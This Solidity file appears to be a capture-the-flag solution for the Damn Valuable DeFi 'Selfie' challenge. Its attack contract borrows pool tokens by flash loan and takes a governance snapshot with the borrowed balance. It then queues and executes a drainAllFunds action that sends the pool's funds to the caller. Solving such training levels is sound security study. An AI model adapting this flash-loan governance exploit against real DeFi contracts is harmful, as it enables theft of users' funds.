// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract AttackerSelfie {

  address public selfiePool;
  address public damnTokenAddress;
  address public governanceAddress;

  event Hola(uint256 valor);

  constructor(address _selfiePool, address _damnTokenAddress, address _governanceAddress) {
    selfiePool = _selfiePool;
    damnTokenAddress = _damnTokenAddress;
    governanceAddress = _governanceAddress;
  }

  function startAttack() external {
    uint256 amountToBorrow = 1100000 ether;

    SelfiePool(selfiePool).flashLoan(amountToBorrow);
  }

  function receiveTokens(address tokenAddress, uint256 borrowAmount) external {

    DamnValuableTokenSnapshot(tokenAddress).snapshot();
    DamnValuableTokenSnapshot(tokenAddress).transfer(selfiePool, borrowAmount);

    emit Hola(1);
  }

  function putActionOnQueue() external {
    address receiver = msg.sender;
    bytes memory data = abi.encodeWithSignature("drainAllFunds(address)",receiver);
    uint256 weiAmount = 0;

    SimpleGovernance(governanceAddress).queueAction(selfiePool, data, weiAmount);
  }

  function execute(uint256 actionId) external {
    SimpleGovernance(governanceAddress).executeAction(actionId);
  }
}

